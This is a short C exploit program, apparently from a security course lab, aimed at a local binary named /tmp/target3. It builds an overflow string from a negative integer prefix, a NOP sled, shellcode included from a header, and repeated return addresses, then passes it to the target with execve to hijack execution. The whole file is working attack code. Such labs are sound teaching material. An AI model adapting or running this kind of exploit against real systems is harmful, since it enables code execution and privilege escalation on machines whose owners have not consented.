#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

struct widget_t {
  int x;
  int y;
  double z;
};

int main(void)
{
  char *args[3];
  char *env[1];

  char crack_str[2668];
  int i;

  strcpy(crack_str, "-2147483482,");
  for(i = 12; i < 2607; i++) crack_str[i] = '\x90';
  strcpy(&crack_str[2607], shellcode);
  for(i = 2652; i < 2668; i+=4) strcpy(&crack_str[i], "\x90\xed\xff\xbf");

  args[0] = TARGET;
  args[1] = crack_str;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
